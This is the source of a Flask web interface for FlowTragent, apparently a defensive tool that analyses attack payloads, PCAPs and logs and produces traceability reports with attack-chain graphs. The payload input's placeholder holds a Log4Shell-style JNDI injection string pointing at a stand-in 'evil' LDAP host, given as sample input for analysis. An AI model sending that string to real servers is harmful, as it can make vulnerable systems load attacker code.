"""Minimal Flask UI for FlowTragent."""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path

from flask import Flask, Response, redirect, render_template_string, request, send_file, send_from_directory, url_for
from werkzeug.utils import secure_filename

from main import run_payload, run_pcap
from src.core.settings import load_config


app = Flask(__name__)
CONFIG = load_config()


PAGE = """
<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>FlowTragent</title>
  <style>
    :root { color-scheme: light; }
    body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; color: #18202a; background: #f7f9fc; }
    main { max-width: 1120px; margin: 0 auto; padding: 28px; }
    header { display: flex; align-items: center; justify-content: space-between; gap: 18px; margin-bottom: 20px; }
    h1 { margin: 0; font-size: 28px; }
    h2 { margin: 0 0 14px; font-size: 18px; }
    section { margin: 18px 0; padding: 18px; border: 1px solid #d8dee8; border-radius: 8px; background: #fff; }
    textarea { width: 100%; min-height: 132px; box-sizing: border-box; font-family: Consolas, monospace; font-size: 13px; }
    input, button { font-size: 14px; padding: 8px; }
    button { cursor: pointer; border: 1px solid #1f6feb; background: #1f6feb; color: white; border-radius: 6px; }
    a { color: #0b5cad; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
    .checks { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; }
    .file-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
    .file-grid label { display: grid; gap: 6px; font-size: 13px; color: #4b5563; }
    .result { background: #eef6ff; border-color: #bfdbfe; }
    .report-list { display: grid; gap: 8px; padding: 0; list-style: none; }
    .report-list li { display: flex; justify-content: space-between; gap: 12px; padding: 10px; border: 1px solid #e5e7eb; border-radius: 6px; }
    @media (max-width: 820px) {
      main { padding: 18px; }
      header, .grid, .file-grid { display: block; }
      section { margin: 14px 0; }
      .file-grid label { margin: 10px 0; }
    }
  </style>
</head>
<body>
<main>
  <header>
    <div>
      <h1>FlowTragent</h1>
      <div>攻击流量输入 -> 多源证据融合 -> 溯源报告</div>
    </div>
    <a href="{{ url_for('index') }}">刷新</a>
  </header>

  <div class="grid">
    <section>
      <h2>Payload 分析</h2>
      <form method="post" action="/analyze-payload">
        <textarea name="payload" placeholder="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim"></textarea>
        <p class="checks">
          <label><input type="checkbox" name="demo_index" checked> demo index</label>
          <label><input type="checkbox" name="enable_rag" checked> RAG</label>
          <label><input type="checkbox" name="enable_ollama"> Ollama</label>
        </p>
        <button type="submit">生成报告</button>
      </form>
    </section>

    <section>
      <h2>PCAP + 日志分析</h2>
      <form method="post" action="/analyze-pcap" enctype="multipart/form-data">
        <div class="file-grid">
          <label>PCAP <input type="file" name="pcap" accept=".pcap,.cap,.pcapng"></label>
          <label>Access Log <input type="file" name="access_log" accept=".log,.txt,.jsonl,.csv"></label>
          <label>DNS Log <input type="file" name="dns_log" accept=".log,.txt,.jsonl,.csv"></label>
          <label>Endpoint Log <input type="file" name="endpoint_log" accept=".log,.txt,.jsonl,.csv"></label>
        </div>
        <p class="checks">
          <label><input type="checkbox" name="demo_index" checked> demo index</label>
          <label><input type="checkbox" name="enable_rag" checked> RAG</label>
          <label><input type="checkbox" name="enable_ollama"> Ollama</label>
        </p>
        <button type="submit">上传并分析</button>
      </form>
    </section>
  </div>

  {% if report %}
  <section class="result">
    <strong>报告已生成：</strong>
    <a href="{{ url_for('view_report', filename=report.name) }}">{{ report.name }}</a>
  </section>
  {% endif %}

  <section>
    <h2>最近报告</h2>
    <form method="get" action="/" style="margin-bottom: 12px;">
      <input name="q" value="{{ q or '' }}" placeholder="按文件名搜索报告">
      <button type="submit">搜索</button>
      <a href="{{ url_for('export_reports_zip') }}">批量导出 ZIP</a>
    </form>
    {% if reports %}
    <ul class="report-list">
      {% for item in reports %}
      <li>
        <span>{{ item.name }}</span>
        <span>
          <a href="{{ url_for('view_report', filename=item.name) }}">查看图谱</a>
          |
          <a href="{{ url_for('download_report', filename=item.name) }}">Markdown</a>
          |
          <a href="{{ url_for('download_report', filename=item.with_suffix('.json').name) }}">JSON</a>
          |
          <form method="post" action="{{ url_for('delete_report', filename=item.name) }}" style="display:inline;" onsubmit="return confirm('确认删除该报告的 Markdown/JSON/DOT/PNG 文件？');">
            <button type="submit" style="padding:3px 6px; background:#b91c1c; border-color:#b91c1c;">删除</button>
          </form>
        </span>
      </li>
      {% endfor %}
    </ul>
    {% else %}
    <p>暂无报告。</p>
    {% endif %}
  </section>
</main>
</body>
</html>
"""


REPORT_PAGE = """
<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{{ filename }} - FlowTragent</title>
  <style>
    body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; color: #18202a; background: #f7f9fc; }
    main { max-width: 1180px; margin: 0 auto; padding: 28px; }
    h1 { font-size: 22px; margin: 0 0 16px; overflow-wrap: anywhere; }
    section { margin: 18px 0; padding: 18px; border: 1px solid #d8dee8; border-radius: 8px; background: #fff; }
    a { color: #0b5cad; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .meta { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; }
    .meta div { padding: 10px; background: #f3f6fa; border-radius: 6px; }
    .graph-svg { width: 100%; min-height: 260px; border: 1px solid #e5e7eb; border-radius: 6px; background: white; }
    pre { overflow: auto; background: #f6f8fa; padding: 12px; border-radius: 6px; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th, td { border-bottom: 1px solid #e5e7eb; padding: 8px; text-align: left; vertical-align: top; }
    code { font-family: Consolas, monospace; }
    @media (max-width: 820px) { main { padding: 18px; } .meta { grid-template-columns: 1fr; } }
  </style>
</head>
<body>
<main>
  <p><a href="{{ url_for('index') }}">返回首页</a></p>
  <h1>{{ filename }}</h1>
  <section class="meta">
    <div><strong>Verdict</strong><br>{{ impact.get("verdict", "N/A") }}</div>
    <div><strong>Confidence</strong><br>{{ impact.get("confidence", "N/A") }}</div>
    <div><strong>Payloads</strong><br>{{ analysis.get("payload_count", 0) }}</div>
    <div><strong>Graph</strong><br>{{ graph.get("nodes", [])|length }} nodes / {{ graph.get("edges", [])|length }} edges</div>
  </section>

  {% if graph.get("mermaid") %}
  <section>
    <h2>Evidence Graph</h2>
    {% if graph.get("dot") %}
    <object class="graph-svg" data="{{ url_for('graph_svg', filename=json_name) }}" type="image/svg+xml">
      <pre>{{ graph.get("dot") }}</pre>
    </object>
    {% endif %}
    <h3>Mermaid</h3>
    <pre>{{ graph.get("mermaid") }}</pre>
    <h3>Graphviz DOT</h3>
    <pre>{{ graph.get("dot", "") }}</pre>
  </section>
  {% endif %}

  {% if analysis.get("attack_chain") %}
  <section>
    <h2>Attack Chain</h2>
    <table>
      <thead><tr><th>Stage</th><th>Technique</th><th>Confidence</th><th>Evidence</th></tr></thead>
      <tbody>
      {% for item in analysis.get("attack_chain", []) %}
      <tr>
        <td>{{ item.get("stage") }}</td>
        <td>{{ item.get("technique") }}</td>
        <td>{{ item.get("confidence") }}</td>
        <td><code>{{ item.get("evidence_ids", [])|join(", ") }}</code></td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </section>
  {% endif %}

  {% if graph.get("edges") %}
  <section>
    <h2>Graph Edges</h2>
    <table>
      <thead><tr><th>Source</th><th>Relation</th><th>Target</th><th>Confidence</th><th>Reason</th></tr></thead>
      <tbody>
      {% for item in graph.get("edges", [])[:40] %}
      <tr>
        <td><code>{{ item.get("source_id") }}</code></td>
        <td>{{ item.get("relation") }}</td>
        <td><code>{{ item.get("target_id") }}</code></td>
        <td>{{ item.get("confidence") }}</td>
        <td>{{ item.get("reason") }}</td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </section>
  {% endif %}

  <section>
    <a href="{{ url_for('download_report', filename=filename) }}">查看 Markdown</a>
    |
    <a href="{{ url_for('download_report', filename=json_name) }}">查看 JSON</a>
  </section>
</main>
</body>
</html>
"""


@app.get("/")
def index():
    q = request.args.get("q", "").strip()
    return render_template_string(PAGE, report=None, reports=_recent_reports(query=q), q=q)


@app.post("/analyze-payload")
def analyze_payload():
    payload = request.form.get("payload", "").strip()
    if not payload:
        return redirect(url_for("index"))
    report = run_payload(
        payload,
        CONFIG,
        Path(CONFIG["paths"]["report_dir"]),
        int(CONFIG["retrieval"]["top_k"]),
        _checked("demo_index"),
        _checked("enable_rag"),
        _checked("enable_ollama"),
    )
    return render_template_string(PAGE, report=report, reports=_recent_reports(), q="")


@app.post("/analyze-pcap")
def analyze_pcap():
    upload = request.files.get("pcap")
    if upload is None or not upload.filename:
        return redirect(url_for("index"))
    filename = secure_filename(upload.filename)
    pcap_path = Path(CONFIG["paths"]["pcap_dir"]) / filename
    pcap_path.parent.mkdir(parents=True, exist_ok=True)
    upload.save(pcap_path)

    uploaded_logs = _save_optional_logs()
    report = run_pcap(
        pcap_path,
        CONFIG,
        Path(CONFIG["paths"]["report_dir"]),
        int(CONFIG["retrieval"]["top_k"]),
        _checked("demo_index"),
        _checked("enable_rag"),
        _checked("enable_ollama"),
        access_logs=uploaded_logs["access_log"],
        dns_logs=uploaded_logs["dns_log"],
        endpoint_logs=uploaded_logs["endpoint_log"],
    )
    return render_template_string(PAGE, report=report, reports=_recent_reports(), q="")


@app.get("/view-report/<path:filename>")
def view_report(filename: str):
    safe_name = secure_filename(filename)
    if not safe_name.endswith(".md"):
        return redirect(url_for("index"))
    report_dir = Path(CONFIG["paths"]["report_dir"])
    json_path = report_dir / safe_name.replace(".md", ".json")
    if not json_path.exists():
        return redirect(url_for("download_report", filename=safe_name))
    analysis = json.loads(json_path.read_text(encoding="utf-8"))
    return render_template_string(
        REPORT_PAGE,
        filename=safe_name,
        json_name=json_path.name,
        analysis=analysis,
        impact=analysis.get("impact_assessment") or {},
        graph=analysis.get("evidence_graph") or {},
    )


@app.get("/reports/<path:filename>")
def download_report(filename: str):
    return send_from_directory(CONFIG["paths"]["report_dir"], secure_filename(filename), as_attachment=False)


@app.post("/delete-report/<path:filename>")
def delete_report(filename: str):
    safe_name = secure_filename(filename)
    report_dir = Path(CONFIG["paths"]["report_dir"])
    stem = Path(safe_name).stem
    for suffix in (".md", ".json", ".dot", ".png", ".svg"):
        target = report_dir / f"{stem}{suffix}"
        if target.exists() and target.resolve().parent == report_dir.resolve():
            target.unlink()
    return redirect(url_for("index"))


@app.get("/export-reports.zip")
def export_reports_zip():
    report_dir = Path(CONFIG["paths"]["report_dir"])
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
    tmp.close()
    with zipfile.ZipFile(tmp.name, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(report_dir.glob("flowtragent_report_*.*")):
            if path.suffix.lower() in {".md", ".json", ".dot", ".png", ".svg"}:
                archive.write(path, arcname=path.name)
    return send_file(tmp.name, mimetype="application/zip", as_attachment=True, download_name="flowtragent_reports.zip")


@app.get("/graph-svg/<path:filename>")
def graph_svg(filename: str):
    safe_name = secure_filename(filename)
    json_path = Path(CONFIG["paths"]["report_dir"]) / safe_name
    if not json_path.exists():
        return Response("Report JSON not found.", status=404, mimetype="text/plain")
    analysis = json.loads(json_path.read_text(encoding="utf-8"))
    dot_text = (analysis.get("evidence_graph") or {}).get("dot")
    if not dot_text:
        return Response("Report does not contain evidence_graph.dot.", status=404, mimetype="text/plain")
    dot_bin = shutil.which("dot")
    if not dot_bin:
        return Response(dot_text, status=200, mimetype="text/plain")
    with tempfile.TemporaryDirectory() as tmp_dir:
        dot_path = Path(tmp_dir) / "graph.dot"
        svg_path = Path(tmp_dir) / "graph.svg"
        dot_path.write_text(dot_text, encoding="utf-8")
        subprocess.run([dot_bin, "-Tsvg", str(dot_path), "-o", str(svg_path)], check=True)
        return Response(svg_path.read_text(encoding="utf-8"), mimetype="image/svg+xml")


def _checked(name: str) -> bool:
    return request.form.get(name) == "on"


def _recent_reports(limit: int = 12, query: str = "") -> list[Path]:
    report_dir = Path(CONFIG["paths"]["report_dir"])
    if not report_dir.exists():
        return []
    reports = sorted(report_dir.glob("*.md"), key=lambda path: path.stat().st_mtime, reverse=True)
    if query:
        reports = [path for path in reports if query.lower() in path.name.lower()]
    return reports[:limit]


def _save_optional_logs() -> dict[str, list[str]]:
    saved = {"access_log": [], "dns_log": [], "endpoint_log": []}
    upload_dir = Path(CONFIG["paths"]["csv_dir"]) / "uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    for field in saved:
        upload = request.files.get(field)
        if upload is None or not upload.filename:
            continue
        filename = secure_filename(upload.filename)
        path = upload_dir / f"{field}_{filename}"
        upload.save(path)
        saved[field].append(str(path))
    return saved


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
